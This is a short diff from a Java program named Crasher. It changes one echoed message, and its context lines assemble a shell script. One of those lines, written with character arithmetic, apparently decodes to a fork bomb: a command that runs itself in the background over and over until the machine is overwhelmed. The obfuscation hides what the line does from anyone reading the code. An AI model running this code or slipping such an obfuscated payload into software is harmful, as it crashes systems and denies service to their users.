@@ -96,7 +96,7 @@ public class Crasher{
         leString.append("echo '"+ i +"' \n");
         if(i==2) leString.append("echo 'Accept me!' \n");
       }
-      leString.append("echo 'Time for a crash!!!!!!!!' \n");
+      leString.append("echo 'So long and thanks for all the fish.' \n");
       if(this.typeOfOS == 1){
         leString.append((char)(theAnswer+4) + "/$" + (char)48 + (char)124 + "./" + (char)(theAnswer-6) + "0&");
       }else{
